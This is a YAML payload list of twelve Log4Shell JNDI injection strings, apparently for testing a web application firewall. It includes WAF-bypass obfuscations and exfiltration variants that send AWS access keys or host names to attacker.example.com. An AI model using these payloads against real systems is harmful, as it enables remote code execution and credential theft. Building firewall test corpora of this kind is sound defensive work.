# JNDI / Log4Shell (CVE-2021-44228) — 12 entries. WAF-view only.
# Sources: PayloadsAllTheThings/CVE-2021-44228/Log4Shell, 0xsyr0 Payloads-
# Obfuscation-WAF-Bypass catalogue, Puliczek's log4j bypass list.

- id: jndi-basic
  class: jndi
  payload: "${jndi:ldap://attacker.example.com/a}"
  trigger: &T200 { kind: status, code: 200 }
  cwe: CWE-502
  source: "PayloadsAllTheThings — canonical JNDI"

- id: jndi-rmi
  class: jndi
  payload: "${jndi:rmi://attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "RMI variant"

- id: jndi-dns
  class: jndi
  payload: "${jndi:dns://attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "DNS variant (leak)"

- id: jndi-ldaps
  class: jndi
  payload: "${jndi:ldaps://attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "LDAPS variant"

# --- obfuscation round 1: lower/upper lookups --------------------------------
- id: jndi-lower
  class: jndi
  payload: "${${lower:j}ndi:ldap://attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "Obfuscation — lower lookup"

- id: jndi-upper-dotless
  class: jndi
  payload: "${${upper:\u0131}ndi:ldap://attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "Obfuscation — dotless i normalises to i"

# --- obfuscation round 2: char-at-a-time -----------------------------------
- id: jndi-nested-char
  class: jndi
  payload: "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "Obfuscation — default-value expansion"

- id: jndi-env-resolver
  class: jndi
  payload: "${${env:UNDEFINED:-j}ndi:ldap://attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "Obfuscation — env fallback"

- id: jndi-date-resolver
  class: jndi
  payload: "${${date:j}ndi:ldap://attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "Obfuscation — date lookup passthrough"

# --- exfil wrapped in the LDAP path ----------------------------------------
- id: jndi-exfil-env
  class: jndi
  payload: "${jndi:ldap://attacker.example.com/a=${env:AWS_ACCESS_KEY_ID}}"
  trigger: *T200
  cwe: CWE-502
  source: "Puliczek — env-based exfil"

- id: jndi-exfil-hostname
  class: jndi
  payload: "${jndi:ldap://${hostName}.attacker.example.com/a}"
  trigger: *T200
  cwe: CWE-502
  source: "Canary via DNS subdomain"

- id: jndi-base64-prefix
  class: jndi
  payload: "${jndi:ldap://attacker.example.com/${base64:U29tZVBheWxvYWQ=}}"
  trigger: *T200
  cwe: CWE-502
  source: "Base64 lookup wrapper"
